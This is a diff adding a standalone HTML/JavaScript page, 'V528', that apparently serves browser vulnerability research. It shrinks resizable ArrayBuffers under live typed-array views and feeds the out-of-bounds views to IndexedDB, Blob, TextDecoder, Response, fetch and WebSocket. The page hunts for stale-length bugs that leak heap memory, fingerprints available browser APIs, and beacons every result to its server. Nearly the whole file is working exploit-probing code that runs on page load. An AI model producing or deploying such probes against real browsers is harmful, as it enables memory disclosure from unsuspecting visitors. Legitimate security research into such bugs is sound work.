@@ -1,0 +1,315 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8"><title>V528</title>
+<style>body{font:11px monospace;background:#111;color:#0f0;margin:8px}
+#log{white-space:pre-wrap;word-break:break-all}</style>
+</head><body>
+<div id="log">V528 — RAB Inverted Check + Platform Recon
+Loading...</div>
+<script>
+var L=document.getElementById('log');
+function log(m){L.textContent+='\n'+m}
+var T0=Date.now();
+function B(tag,body){
+  var msg='['+(Date.now()-T0)+'ms] '+(body||'');
+  log('>> '+tag+': '+msg);
+  try{var x=new XMLHttpRequest();x.open('POST','/beacon/V528-'+tag,false);
+  x.setRequestHeader('Content-Type','text/plain');x.send(msg)}catch(e){}
+}
+
+B('BOOT',navigator.userAgent);
+
+// === T1: RAB availability + basic check ===
+setTimeout(function(){
+  try{
+    B('T1-START','RAB availability');
+    var r=new ArrayBuffer(256,{maxByteLength:512});
+    B('T1-RAB','resizable='+r.resizable+' bl='+r.byteLength+' max='+r.maxByteLength);
+    r.resize(128);
+    B('T1-RESIZE','bl='+r.byteLength);
+    r.resize(256);
+    B('T1-RESTORE','bl='+r.byteLength);
+
+    // Create view, check JS-visible vs C++ behavior
+    var v=new Uint8Array(r,0,256);
+    for(var i=0;i<256;i++) v[i]=0xAA;
+    B('T1-VIEW','len='+v.length+' bo='+v.byteOffset);
+
+    // IDBKeyRange availability
+    B('T1-IDBKR','typeof='+(typeof IDBKeyRange));
+    B('T1-DONE','ok');
+  }catch(e){B('T1-ERR',''+e)}
+},500);
+
+// === T2: IDBKeyRange.only() with normal AB (baseline) ===
+setTimeout(function(){
+  try{
+    B('T2-START','IDBKeyRange baseline');
+    var buf=new ArrayBuffer(64);
+    var view=new Uint8Array(buf);
+    for(var i=0;i<64;i++) view[i]=0xBB;
+    var key=IDBKeyRange.only(view);
+    B('T2-KEY','type='+(typeof key.lower));
+    if(key.lower instanceof ArrayBuffer){
+      var r=new Uint8Array(key.lower);
+      B('T2-DATA','len='+r.length+' [0]=0x'+r[0].toString(16)+' [63]=0x'+r[63].toString(16));
+    } else {
+      B('T2-DATA','lower='+key.lower+' type='+(typeof key.lower));
+    }
+  }catch(e){B('T2-ERR',''+e)}
+},2000);
+
+// === T3: IDBKeyRange with RAB in-bounds view ===
+setTimeout(function(){
+  try{
+    B('T3-START','IDBKeyRange RAB in-bounds');
+    var rab=new ArrayBuffer(256,{maxByteLength:256});
+    var rv=new Uint8Array(rab,0,256);
+    for(var i=0;i<256;i++) rv[i]=0xCC;
+    B('T3-FILLED','view.length='+rv.length);
+
+    var key=IDBKeyRange.only(rv);
+    B('T3-KEY','created');
+    if(key.lower instanceof ArrayBuffer){
+      var r=new Uint8Array(key.lower);
+      B('T3-RESULT','len='+r.length+' [0]='+(r.length>0?'0x'+r[0].toString(16):'empty'));
+      // len=0 → inverted check active (C++ byteLength=0)
+      // len=256 → normal/fixed
+    } else {
+      B('T3-RESULT','lower type='+(typeof key.lower)+' val='+key.lower);
+    }
+  }catch(e){B('T3-ERR',''+e)}
+},4000);
+
+// === T4: IDBKeyRange with RAB OOB view (after resize) ===
+setTimeout(function(){
+  try{
+    B('T4-START','IDBKeyRange RAB OOB');
+    var rab=new ArrayBuffer(0x2000,{maxByteLength:0x2000});
+    var oobView=new Uint8Array(rab,0x1000,0x1000);
+    for(var i=0;i<0x1000;i++) oobView[i]=0x42;
+    // Fill first half differently
+    var fh=new Uint8Array(rab,0,0x1000);
+    for(var i=0;i<0x1000;i++) fh[i]=0xDE;
+    B('T4-FILLED','view at 0x1000 len='+oobView.length);
+
+    rab.resize(0x800);
+    B('T4-RESIZED','buf.bl='+rab.byteLength+' view.length='+oobView.length+' view.bo='+oobView.byteOffset);
+
+    // JS sees length=0 (OOB spec behavior)
+    // C++ byteLength() should return stale 0x1000 (inverted check)
+    // C++ byteOffset() should return stale 0x1000 (inverted check)
+    var key=IDBKeyRange.only(oobView);
+    B('T4-KEY','created');
+    if(key.lower instanceof ArrayBuffer){
+      var r=new Uint8Array(key.lower);
+      B('T4-RESULT','len='+r.length);
+      if(r.length>0){
+        var hex=[];
+        for(var i=0;i<Math.min(32,r.length);i++) hex.push(('0'+r[i].toString(16)).slice(-2));
+        B('T4-HEX',hex.join(' '));
+        // Expect: 0x42 bytes (our fill) — data from original allocation
+        var foreign=0;
+        for(var i=0;i<r.length;i++) if(r[i]!==0x42) foreign++;
+        B('T4-ANALYSIS','total='+r.length+' non42='+foreign);
+      }
+    }
+  }catch(e){B('T4-ERR',''+e)}
+},6000);
+
+// === T5: IDBKeyRange with RAB resize(0) ===
+setTimeout(function(){
+  try{
+    B('T5-START','IDBKeyRange RAB resize(0)');
+    var rab=new ArrayBuffer(0x1000,{maxByteLength:0x1000});
+    var zv=new Uint8Array(rab,0,0x1000);
+    for(var i=0;i<0x1000;i++) zv[i]=0x55;
+    rab.resize(0);
+    B('T5-RESIZED','buf.bl='+rab.byteLength+' view.length='+zv.length);
+
+    // If resize(0) decommits pages, this might crash
+    var key=IDBKeyRange.only(zv);
+    if(key.lower instanceof ArrayBuffer){
+      var r=new Uint8Array(key.lower);
+      B('T5-RESULT','len='+r.length);
+      if(r.length>0){
+        var hex=[];
+        for(var i=0;i<Math.min(16,r.length);i++) hex.push(('0'+r[i].toString(16)).slice(-2));
+        B('T5-HEX',hex.join(' '));
+        var nonzero=0;for(var i=0;i<r.length;i++) if(r[i]!==0) nonzero++;
+        B('T5-NONZERO',nonzero+'/'+r.length);
+      }
+    }
+  }catch(e){B('T5-ERR',''+e)}
+},8000);
+
+// === T6: Blob constructor with RAB views ===
+setTimeout(function(){
+  try{
+    B('T6-START','Blob RAB sinks');
+    // In-bounds
+    var rab=new ArrayBuffer(256,{maxByteLength:256});
+    var rv=new Uint8Array(rab,0,256);
+    for(var i=0;i<256;i++) rv[i]=0xEE;
+    var blob=new Blob([rv]);
+    B('T6-BLOB-IN','size='+blob.size);
+
+    // Read blob content
+    var fr=new FileReader();
+    fr.onload=function(){
+      var ab=fr.result;
+      var u=new Uint8Array(ab);
+      B('T6-BLOB-IN-DATA','len='+u.length+' [0]='+(u.length>0?'0x'+u[0].toString(16):'empty'));
+    };
+    fr.readAsArrayBuffer(blob);
+
+    // OOB blob
+    setTimeout(function(){
+      var rab2=new ArrayBuffer(512,{maxByteLength:512});
+      var rv2=new Uint8Array(rab2,0,512);
+      for(var i=0;i<512;i++) rv2[i]=0xDD;
+      rab2.resize(64);
+      var blob2=new Blob([rv2]);
+      B('T6-BLOB-OOB','size='+blob2.size+' view.length='+rv2.length);
+      var fr2=new FileReader();
+      fr2.onload=function(){
+        var u2=new Uint8Array(fr2.result);
+        B('T6-BLOB-OOB-DATA','len='+u2.length+' [0]='+(u2.length>0?'0x'+u2[0].toString(16):'empty'));
+      };
+      fr2.readAsArrayBuffer(blob2);
+    },500);
+  }catch(e){B('T6-ERR',''+e)}
+},10000);
+
+// === T7: TextDecoder with RAB views ===
+setTimeout(function(){
+  try{
+    B('T7-START','TextDecoder RAB');
+    var td=new TextDecoder();
+
+    // In-bounds
+    var rab=new ArrayBuffer(32,{maxByteLength:32});
+    var rv=new Uint8Array(rab,0,32);
+    for(var i=0;i<32;i++) rv[i]=0x41; // 'A'
+    var txt=td.decode(rv);
+    B('T7-TD-IN','len='+txt.length+' val="'+txt.substring(0,10)+'"');
+    // len=0 → C++ sees byteLength=0 (inverted)
+    // len=32 → normal
+
+    // OOB
+    var rab2=new ArrayBuffer(64,{maxByteLength:64});
+    var rv2=new Uint8Array(rab2,0,64);
+    for(var i=0;i<64;i++) rv2[i]=0x42; // 'B'
+    rab2.resize(8);
+    var txt2=td.decode(rv2);
+    B('T7-TD-OOB','len='+txt2.length+' val="'+txt2.substring(0,20)+'"');
+  }catch(e){B('T7-ERR',''+e)}
+},13000);
+
+// === T8: Response body with RAB ===
+setTimeout(function(){
+  try{
+    B('T8-START','Response RAB');
+    // In-bounds
+    var rab=new ArrayBuffer(128,{maxByteLength:128});
+    var rv=new Uint8Array(rab,0,128);
+    for(var i=0;i<128;i++) rv[i]=0xCC;
+    var resp=new Response(rv);
+    resp.arrayBuffer().then(function(ab){
+      var u=new Uint8Array(ab);
+      B('T8-RESP-IN','len='+u.length+' [0]='+(u.length>0?'0x'+u[0].toString(16):'empty'));
+    }).catch(function(e){B('T8-RESP-IN-ERR',''+e)});
+
+    // OOB
+    var rab2=new ArrayBuffer(256,{maxByteLength:256});
+    var rv2=new Uint8Array(rab2,0,256);
+    for(var i=0;i<256;i++) rv2[i]=0xFF;
+    rab2.resize(32);
+    var resp2=new Response(rv2);
+    resp2.arrayBuffer().then(function(ab){
+      var u=new Uint8Array(ab);
+      B('T8-RESP-OOB','len='+u.length+' [0]='+(u.length>0?'0x'+u[0].toString(16):'empty'));
+    }).catch(function(e){B('T8-RESP-OOB-ERR',''+e)});
+  }catch(e){B('T8-ERR',''+e)}
+},16000);
+
+// === T9: fetch() POST with RAB view ===
+setTimeout(function(){
+  try{
+    B('T9-START','fetch POST RAB');
+    // Send RAB view as POST body to our beacon — server sees the length
+    var rab=new ArrayBuffer(128,{maxByteLength:128});
+    var rv=new Uint8Array(rab,0,128);
+    for(var i=0;i<128;i++) rv[i]=0xAB;
+
+    fetch('/beacon/V528-T9-FETCH-IN',{method:'POST',body:rv}).then(function(r){
+      B('T9-FETCH-IN','status='+r.status);
+    }).catch(function(e){B('T9-FETCH-IN-ERR',''+e)});
+
+    // OOB fetch
+    var rab2=new ArrayBuffer(512,{maxByteLength:512});
+    var rv2=new Uint8Array(rab2,0,512);
+    for(var i=0;i<512;i++) rv2[i]=0xCD;
+    rab2.resize(64);
+    fetch('/beacon/V528-T9-FETCH-OOB',{method:'POST',body:rv2}).then(function(r){
+      B('T9-FETCH-OOB','status='+r.status);
+    }).catch(function(e){B('T9-FETCH-OOB-ERR',''+e)});
+  }catch(e){B('T9-ERR',''+e)}
+},19000);
+
+// === T10: Platform recon ===
+setTimeout(function(){
+  try{
+    B('T10-START','platform recon');
+    B('T10-MSE','MediaSource='+(typeof MediaSource));
+    B('T10-SRCBUF','SourceBuffer='+(typeof SourceBuffer));
+    B('T10-IDB','indexedDB='+(typeof indexedDB));
+    B('T10-IDBKR','IDBKeyRange='+(typeof IDBKeyRange));
+    B('T10-WS','WebSocket='+(typeof WebSocket));
+    B('T10-RTC','RTCPeerConnection='+(typeof RTCPeerConnection));
+    B('T10-RTCDC','RTCDataChannel='+(typeof RTCDataChannel));
+    B('T10-PERF','performance.now='+(typeof performance!=='undefined'?performance.now():'N/A'));
+    B('T10-CRYPTO','crypto.subtle='+(typeof crypto!=='undefined'&&crypto.subtle?'yes':'no'));
+    B('T10-COMP','CompressionStream='+(typeof CompressionStream));
+    B('T10-LOCK','navigator.locks='+(typeof navigator!=='undefined'&&navigator.locks?'yes':'no'));
+    B('T10-DONE','ok');
+  }catch(e){B('T10-ERR',''+e)}
+},22000);
+
+// === T11: WebSocket send with RAB (if WebSocket available) ===
+setTimeout(function(){
+  try{
+    B('T11-START','WebSocket RAB');
+    if(typeof WebSocket==='undefined'){B('T11-DEAD','no WebSocket');return}
+
+    // We need a WS endpoint. Use our own server if it supports WS.
+    // If not, just test the constructor
+    B('T11-WS','constructor available');
+
+    // Try connecting to our host
+    try{
+      var ws=new WebSocket('ws://'+location.hostname+'/ws');
+      ws.onopen=function(){
+        B('T11-OPEN','connected');
+        // Send in-bounds RAB view
+        var rab=new ArrayBuffer(64,{maxByteLength:64});
+        var rv=new Uint8Array(rab,0,64);
+        for(var i=0;i<64;i++) rv[i]=0xAB;
+        try{ws.send(rv);B('T11-SENT-IN','ok')}catch(e){B('T11-SENT-IN-ERR',''+e)}
+
+        // Send OOB RAB view
+        var rab2=new ArrayBuffer(128,{maxByteLength:128});
+        var rv2=new Uint8Array(rab2,0,128);
+        for(var i=0;i<128;i++) rv2[i]=0xCD;
+        rab2.resize(16);
+        try{ws.send(rv2);B('T11-SENT-OOB','ok')}catch(e){B('T11-SENT-OOB-ERR',''+e)}
+
+        ws.close();
+      };
+      ws.onerror=function(){B('T11-WS-ERR','connection failed')};
+      setTimeout(function(){if(ws.readyState!==1)B('T11-TIMEOUT','no connect')},3000);
+    }catch(e){B('T11-WS-OPEN-ERR',''+e)}
+  }catch(e){B('T11-ERR',''+e)}
+},25000);
+
+setTimeout(function(){B('COMPLETE','all tests done')},30000);
+</script></body></html>
